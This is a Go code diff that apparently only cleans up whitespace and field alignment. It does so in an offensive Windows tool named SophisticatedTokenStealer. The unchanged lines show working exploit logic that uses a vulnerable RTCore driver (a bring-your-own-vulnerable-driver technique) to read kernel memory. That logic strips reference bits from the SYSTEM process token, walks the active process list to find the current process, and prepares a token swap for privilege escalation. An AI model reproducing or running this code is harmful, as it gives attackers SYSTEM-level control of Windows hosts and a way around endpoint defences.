@@ -107,15 +107,15 @@ func FindOffsets(rtcore *byovd.RTCoreEnhancedExploit, psInitialSystemProcessAddr
 type SophisticatedTokenStealer struct {
 	rtcore *byovd.RTCoreEnhancedExploit
 	logger *logger.Logger
-	
+
 	// Discovered offsets
 	tokenOffset              uint64
 	activeProcessLinksOffset uint64
 	uniqueProcessIdOffset    uint64
-	
+
 	// System process information
-	ntoskrnlBase                     uint64
-	psInitialSystemProcessAddress    uint64
+	ntoskrnlBase                  uint64
+	psInitialSystemProcessAddress uint64
 }
 
 // NewSophisticatedTokenStealer - Create enhanced token stealer
@@ -195,7 +195,7 @@ func (t *SophisticatedTokenStealer) StealSystemToken() error {
 	if err != nil {
 		return fmt.Errorf("failed to read system process token: %v", err)
 	}
-	
+
 	// Strip reference counter bits (lower 4 bits)
 	systemProcessToken &^= 15
 	t.logger.Infof("System process token: 0x%X", systemProcessToken)
@@ -214,22 +214,22 @@ func (t *SophisticatedTokenStealer) StealSystemToken() error {
 		if err != nil {
 			return fmt.Errorf("failed to read UniqueProcessId: %v", err)
 		}
-		
+
 		if uniqueProcessId == uint64(currentProcessId) {
 			currentProcessAddress = processAddress
 			break
 		}
-		
+
 		currentProcessAddress, err = t.rtcore.ReadMemoryDWORD64(processAddress + t.activeProcessLinksOffset)
 		if err != nil {
 			return fmt.Errorf("failed to read next process link: %v", err)
 		}
-		
+
 		if currentProcessAddress == processHead {
 			return fmt.Errorf("failed to find current process in active process list")
 		}
 	}
-	
+
 	t.logger.Infof("Current process address: 0x%X", currentProcessAddress)
 
 	// Step 4: Get current process token and preserve reference counter
@@ -237,7 +237,7 @@ func (t *SophisticatedTokenStealer) StealSystemToken() error {
 	if err != nil {
 		return fmt.Errorf("failed to read current process token: %v", err)
 	}
-	
+
 	currentProcessTokenReferenceCounter := currentProcessFastToken & 15
 	currentProcessToken := currentProcessFastToken &^ 15
 	t.logger.Infof("Current process token: 0x%X", currentProcessToken)
